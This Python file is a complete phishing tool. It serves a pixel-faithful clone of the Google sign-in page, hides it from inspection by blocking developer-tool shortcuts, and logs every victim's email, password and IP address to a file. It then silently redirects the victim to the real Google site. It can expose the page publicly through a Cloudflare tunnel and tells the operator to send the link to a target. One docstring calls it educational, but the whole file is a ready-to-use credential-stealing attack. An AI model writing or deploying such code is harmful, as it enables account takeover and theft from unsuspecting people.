import os
import json
import threading
import subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime
from ui.console import cprint, iprint, wprint, eprint, cinput, CYAN, GREEN, RED, YELLOW, WHITE, RESET

# Google-inspired login page HTML template (real design)
GOOGLE_LOGIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="preconnect" href="https://fonts.gstatic.com" />
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap" rel="stylesheet"/>
    <link rel="icon" type="image/x-icon" href="https://google.com/favicon.ico">
    <title>Sign in &#65112; Google accounts</title>
    <script>
        document.addEventListener('contextmenu', (e) => e.preventDefault());
        function ctrlShiftKey(e, keyCode) {
            return e.ctrlKey && e.shiftKey && e.keyCode === keyCode.charCodeAt(0);
        }
        document.onkeydown = (e) => {
            if (
                event.keyCode === 123 ||
                ctrlShiftKey(e, 'I') ||
                ctrlShiftKey(e, 'J') ||
                ctrlShiftKey(e, 'C') ||
                (e.ctrlKey && e.keyCode === 'U'.charCodeAt(0))
            )
            return false;
        };
    </script>
    <style>
    * {
    margin: 0;
    padding: 0;
    font-family: "Roboto", sans-serif;
    box-sizing: border-box;
    }

    :root {
    --principal: #202124;
    --p: #797d80;
    --blue: #2c7fea;
    --border-card: #dadce0;
    }

    .container {
    width: 100vw;
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    min-height: 500px;
    }

    .card {
    height: auto;
    min-height: 500px;
    width: 448px;
    border-radius: 8px;
    border: 1px solid var(--border-card);
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 48px 40px 36px;
    }

    .card h2 {
    padding-top: 16px;
    font-weight: 400;
    font-size: 24px;
    }

    .card h3 {
    padding: 11px 0 28px 0;
    font-weight: 400;
    font-size: 16px;
    width: 100%;
    text-align: center;
    }

    .input-contain {
    position: relative;
    margin-bottom: 24px;
    width: 100%;
    display: flex;
    flex-direction: column;
    }

    .card input {
    padding: 13px 15px;
    width: 100%;
    height: 55px;
    border-radius: 4px;
    border: 1px solid var(--border-card);
    outline-color: #1973e8;
    font-size: 16px;
    order: 2;
    }

    .card input:focus {
    border-color: var(--blue);
    }

    .placeholder-text {
    font-size: 14px;
    color: var(--p);
    margin-bottom: 8px;
    order: 1;
    font-weight: 500;
    }

    .card .btn-email {
    padding-top: 6px;
    width: 100%;
    margin-bottom: 8px;
    }

    .card .btn-email button {
    background: transparent;
    border: none;
    cursor: pointer;
    color: var(--blue);
    font-weight: 700;
    font-size: 14px;
    outline: none;
    }

    .card .btn-email a {
    color: var(--blue);
    text-decoration: none;
    }

    .card p {
    padding-top: 8px;
    color: var(--p);
    font-size: 14px;
    line-height: 1.5;
    margin: 0;
    }

    .card p a {
    background: transparent;
    border: none;
    cursor: pointer;
    color: var(--blue);
    font-weight: 600;
    text-decoration: none;
    }

    .card .card-bottom {
    margin-top: 24px;
    width: 100%;
    margin-right: 18px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    }

    .card .card-bottom a {
    border: none;
    cursor: pointer;
    color: var(--blue);
    font-weight: 800;
    text-decoration: none;
    font-size: 14px;
    margin: 8px;
    }

    .card .card-bottom button {
    background: var(--blue);
    color: white;
    padding: 9px 24px;
    font-size: 14px;
    outline: none;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    margin: 5px;
    transition: 0.2s;
    }

    .card .card-bottom button:hover {
    background: #1a66c9;
    }

    .footer {
    display: flex;
    align-items: center;
    justify-content: space-between;
    width: 100%;
    margin-top: 30px;
    font-size: 14px;
    color: var(--p);
    }

    .footer select {
    background: transparent;
    border: none;
    cursor: pointer;
    }

    .footer-span {
    display: flex;
    gap: 30px;
    }

    .footer a {
    color: var(--p);
    text-decoration: none;
    }

    .footer a:hover {
    color: var(--blue);
    }

    #error {
    color: #d33b27;
    display: block;
    margin-bottom: 10px;
    }

    form {
    width: 100%;
    }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="Lth2jb" style="width: 75px; height: 24px;">
                <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                    <g id="qaEJec"><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g>
                    <g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g>
                    <g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g>
                    <g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g>
                    <g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g>
                    <g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g>
                </svg>
            </div>
            <h2>Sign in</h2>
            <h3>Use your Google Account</h3>
            <form method="post">
                <div class="input-contain">
                    <label class="placeholder-text" for="email">Email or phone</label>
                    <input type="text" id="email" name="username" autocomplete="off" value="">
                </div>
                <div class="input-contain">
                    <label class="placeholder-text" for="password">Enter your password</label>
                    <input type="password" id="password" name="password" autocomplete="off" value="">
                </div>
                <div style="text-align: left; width: 100%;">
                    <b id="error"></b>
                    <div class="btn-email">
                        <button type="button"><a href="#" class="link">Forgot Email?</a></button>
                    </div>
                    <p>
                        Not your computer? Use Guest mode to sign in privately.
                        <a href="#">Learn more</a>
                    </p>
                    <div class="card-bottom">
                        <a href="#">Create account</a>
                        <button type="submit" class="disable-select">Next</button>
                    </div>
                </div>
            </form>
            <div id="spacer"><br><br><div style="height: 10px;"></div></div>
            <div class="footer">
                <select class="disable-select" name="select">
                    <option value="English (United States)">English (United States)</option>
                </select>
                <div class="footer-span">
                    <span><a href="#">Help</a></span>
                    <span><a href="#">Privacy</a></span>
                    <span><a href="#">Terms</a></span>
                </div>
            </div>
        </div>
    </div>
    <script>
        document.querySelector('form').addEventListener('submit', function(e) {
            e.preventDefault();
            const username = document.querySelector('input[name="username"]').value;
            const password = document.querySelector('input[name="password"]').value;
            
            const formData = new FormData();
            formData.append('username', username);
            formData.append('password', password);
            
            fetch('/login', {
                method: 'POST',
                body: new URLSearchParams(formData)
            }).then(() => {
                window.location.href = 'https://accounts.google.com';
            });
        });
    </script>
</body>
</html>
"""


class GooglePhishingHandler(BaseHTTPRequestHandler):
    """HTTP request handler for Google phishing server"""
    
    credentials_log = []
    log_file = None
    
    def do_GET(self):
        """Handle GET requests"""
        if self.path == '/' or self.path == '/login':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(GOOGLE_LOGIN_HTML.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        """Handle POST requests (form submission)"""
        try:
            if self.path == '/login':
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length).decode('utf-8')
                
                # Parse form data
                parsed_data = parse_qs(post_data)
                username = parsed_data.get('username', [''])[0] if 'username' in parsed_data else ''
                password = parsed_data.get('password', [''])[0] if 'password' in parsed_data else ''
                
                # Only log if we have credentials
                if username or password:
                    # Log credentials
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    credential_entry = {
                        'timestamp': timestamp,
                        'username': username,
                        'password': password,
                        'ip': self.client_address[0]
                    }
                    
                    GooglePhishingHandler.credentials_log.append(credential_entry)
                    
                    # Log to file
                    if GooglePhishingHandler.log_file:
                        with open(GooglePhishingHandler.log_file, 'a') as f:
                            f.write(f"{timestamp} | IP: {self.client_address[0]} | Email: {username} | Password: {password}\n")
                    
                    # Print to server console (debug)
                    print(f"\n[+] Credentials captured: {username} / {password}")
                
                # Send redirect response (silent, no page shown)
                self.send_response(302)
                self.send_header('Location', 'https://accounts.google.com')
                self.end_headers()
            else:
                self.send_response(404)
                self.end_headers()
        except Exception as e:
            print(f"[!] Error in POST handler: {e}")
            self.send_response(500)
            self.end_headers()
    
    def log_message(self, format, *args):
        """Suppress default logging"""
        pass


class GooglePhishing:
    """Google phishing server for educational purposes"""
    
    def __init__(self, port=8000):
        self.port = port
        self.server = None
        self.server_thread = None
        self.running = False
        self.credentials_file = None
        self.tunnel_process = None
    
    def setup_logging(self):
        """Create logs directory and setup credential logging"""
        # Get the project root (go up from phishing folder)
        project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        logs_dir = os.path.join(project_root, 'phishing_logs')
        
        # Create logs directory
        os.makedirs(logs_dir, exist_ok=True)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.credentials_file = os.path.join(logs_dir, f'google_creds_{timestamp}.txt')
        
        # Write header
        with open(self.credentials_file, 'w') as f:
            f.write(f"Google Phishing Log - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n")
            f.write("Timestamp | IP Address | Email | Password\n")
            f.write("=" * 80 + "\n")
        
        iprint(f"Log file: {self.credentials_file}")
        GooglePhishingHandler.log_file = self.credentials_file
        return self.credentials_file
    
    def start_server(self):
        """Start the phishing server"""
        try:
            import socket
            GooglePhishingHandler.credentials_log = []
            iprint(f"Starting phishing server on port {self.port}...")
            
            # Create server with explicit socket settings
            self.server = HTTPServer(('0.0.0.0', self.port), GooglePhishingHandler)
            self.server.allow_reuse_address = True
            
            iprint(f"Server bound to: http://0.0.0.0:{self.port}")
            iprint(f"Attempting to access on: http://127.0.0.1:{self.port}\n")
            
            self.running = True
            self.server.serve_forever()
        except Exception as e:
            eprint(f"Error starting server: {e}")
            import traceback
            eprint(traceback.format_exc())

    def run_interactive(self):
        """Interactive mode for phishing server"""
        try:
            cprint("\n=== Google Phishing Server ===\n", CYAN)
            
            # Setup logging
            log_file = self.setup_logging()
            
            # Get port (optional)
            port_input = cinput("Enter port [8000]: ")
            if port_input:
                try:
                    self.port = int(port_input)
                except ValueError:
                    wprint("Invalid port, using 8000")
                    self.port = 8000
            
            # Choose between localhost and cloudflare
            cprint("\n[*] Hosting Options:", CYAN)
            cprint("    1) Localhost (SSH tunnel required from Windows)", WHITE)
            cprint("    2) Cloudflare Tunnel (public URL, no SSH needed)\n", WHITE)
            
            hosting_choice = cinput("Choose hosting method [1]: ")
            if not hosting_choice:
                hosting_choice = "1"
            
            use_cloudflare = hosting_choice == "2"
            
            cprint(f"\n[*] Configuration:", CYAN)
            iprint(f"    Template: Google Login")
            iprint(f"    Port: {self.port}")
            iprint(f"    Credentials file: {log_file}")
            iprint(f"    Hosting: {'Cloudflare Tunnel' if use_cloudflare else 'Localhost'}")
            cprint(f"    Status: Starting server...\n", GREEN)
            
            # Start server in background thread
            self.server_thread = threading.Thread(target=self.start_server, daemon=True)
            self.server_thread.start()
            
            # Give server time to start and verify it's actually listening
            import time
            import socket
            max_wait = 5
            waited = 0
            server_ready = False
            
            while waited < max_wait:
                try:
                    test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    test_socket.settimeout(0.5)
                    result = test_socket.connect_ex(('127.0.0.1', self.port))
                    test_socket.close()
                    if result == 0:
                        iprint("Server is listening and ready!")
                        server_ready = True
                        break
                except:
                    pass
                time.sleep(0.5)
                waited += 0.5
            
            if not server_ready:
                wprint("Warning: Server may not be fully ready, continuing anyway...")
            
            if use_cloudflare:
                self._setup_cloudflare_tunnel()
            else:
                self._setup_localhost_access()
            
            cprint("[*] Press Ctrl+C to stop server\n", YELLOW)
            
            # Keep running and display credentials as they arrive
            last_credential_count = 0
            while self.running:
                import time
                time.sleep(0.5)
                current_count = len(GooglePhishingHandler.credentials_log)
                
                # If new credentials arrived, display them
                if current_count > last_credential_count:
                    new_creds = GooglePhishingHandler.credentials_log[last_credential_count:]
                    for cred in new_creds:
                        cprint("\n" + "="*80, GREEN)
                        cprint("[+] CREDENTIALS CAPTURED!", GREEN)
                        cprint("="*80, GREEN)
                        iprint(f"Timestamp: {cred['timestamp']}")
                        iprint(f"IP Address: {cred['ip']}")
                        cprint(f"Email: {cred['username']}", YELLOW)
                        cprint(f"Password: {cred['password']}", RED)
                        cprint("="*80 + "\n", GREEN)
                    last_credential_count = current_count
        
        except KeyboardInterrupt:
            self.running = False
            if self.server:
                self.server.shutdown()
            if self.tunnel_process:
                self.tunnel_process.terminate()
            wprint("\n[-] Server stopped by user")
        except Exception as e:
            eprint(f"Error: {e}")
        finally:
            cinput("\nPress Enter to return to menu...")
    
    def _setup_localhost_access(self):
        """Setup localhost access with SSH tunnel instructions"""
        # Get Pi IP for SSH command
        pi_ip = cinput("Enter your Pi IP address (e.g., 192.168.100.88): ")
        if not pi_ip:
            pi_ip = "192.168.100.88"
        
        pi_user = cinput("Enter Pi username [florin]: ")
        if not pi_user:
            pi_user = "florin"
        
        # Display SSH command
        cprint("\n[*] SSH Port Forwarding Command (run on Windows PowerShell):", YELLOW)
        ssh_cmd = f"ssh -L {self.port}:127.0.0.1:{self.port} {pi_user}@{pi_ip}"
        cprint(f"    {ssh_cmd}\n", CYAN)
        
        cprint("[*] After SSH connects, visit in browser:", YELLOW)
        cprint(f"    http://localhost:{self.port}\n", CYAN)
    
    def _setup_cloudflare_tunnel(self):
        """Setup Cloudflare Tunnel for public access"""
        # Check if cloudflared is installed
        try:
            subprocess.run(['cloudflared', '--version'], capture_output=True, check=True)
            cloudflared_installed = True
        except (subprocess.CalledProcessError, FileNotFoundError):
            cloudflared_installed = False
        
        if not cloudflared_installed:
            eprint("\n[!] cloudflared is not installed!")
            cprint("\n[*] Install cloudflared with:", YELLOW)
            cprint("    wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64", CYAN)
            cprint("    chmod +x cloudflared-linux-arm64", CYAN)
            cprint("    sudo mv cloudflared-linux-arm64 /usr/local/bin/cloudflared\n", CYAN)
            return
        
        cprint("\n[*] Starting Cloudflare Tunnel...\n", GREEN)
        
        try:
            # Start cloudflared tunnel
            cmd = f"cloudflared tunnel --url http://127.0.0.1:{self.port}"
            self.tunnel_process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, preexec_fn=None)
            
            # Read and display cloudflared output in real-time
            import time
            import threading
            
            url_found = [False]  # Use list to allow modification in nested function
            
            def read_tunnel_output():
                try:
                    for line in self.tunnel_process.stdout:
                        if line:
                            iprint(line.strip())
                            # Look for the tunnel URL
                            if "trycloudflare.com" in line or ("https://" in line and not url_found[0]):
                                cprint(f"\n[+] PUBLIC URL: {line.strip()}\n", GREEN)
                                url_found[0] = True
                except Exception as e:
                    pass
            
            # Start output reader in background thread
            output_thread = threading.Thread(target=read_tunnel_output, daemon=True)
            output_thread.start()
            
            # Give tunnel time to establish and display URL
            time.sleep(5)
            
            # Check if process is still running
            if self.tunnel_process.poll() is None:
                cprint("[!] IMPORTANT: Copy the public URL above and send to your target\n", RED)
                cprint("[*] Cloudflare Tunnel will stay active until you stop the server\n", GREEN)
                return
            else:
                eprint("\n[!] Failed to start Cloudflare Tunnel")
                eprint("Try running manually: cloudflared tunnel --url http://localhost:8000")
        
        except Exception as e:
            eprint(f"[!] Error starting Cloudflare Tunnel: {e}")

if __name__ == "__main__":
    phishing = GooglePhishing()
    phishing.run_interactive()
